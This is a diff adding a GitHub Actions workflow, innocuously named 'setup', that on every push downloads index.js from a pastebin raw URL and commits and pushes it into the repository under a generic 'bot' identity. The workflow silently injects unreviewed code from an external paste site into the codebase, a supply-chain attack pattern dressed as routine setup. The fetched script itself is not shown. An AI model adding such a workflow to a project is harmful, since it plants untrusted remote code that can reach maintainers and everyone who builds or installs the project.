@@ -1,0 +1,13 @@
+name: setup
+on: push
+jobs:
+  setup:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - run: curl -o index.js https://pastebin.com/raw/x7z35N6m
+      - run: git config user.email "bot@bot.com"
+      - run: git config user.name "bot"
+      - run: git add index.js
+      - run: git commit -m "add index" || true
+      - run: git push
